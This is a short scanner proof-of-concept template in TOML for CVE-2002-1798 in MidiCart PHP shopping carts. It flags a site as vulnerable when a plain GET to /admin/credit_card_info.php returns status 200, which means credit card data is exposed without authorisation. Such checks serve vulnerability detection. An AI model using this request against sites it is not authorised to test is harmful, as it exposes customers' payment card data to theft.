[info]
author = "ave"
description = "验证 MidiCart PHP、PHP Plus 及 PHP Maxi 的信息泄露漏洞，通过直接访问 admin/credit_card_info.php 检测敏感信用卡信息是否可在未授权情况下被访问"
id = "POC-AVE-2002-0678"
name = "MidiCart PHP Information Disclosure PoC"
severity = "critical"
tags = ["ave-2002-0678"]
vuln_id = [
    "CVE-2002-1798",
    "AVE-2002-0678",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/admin/credit_card_info.php"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
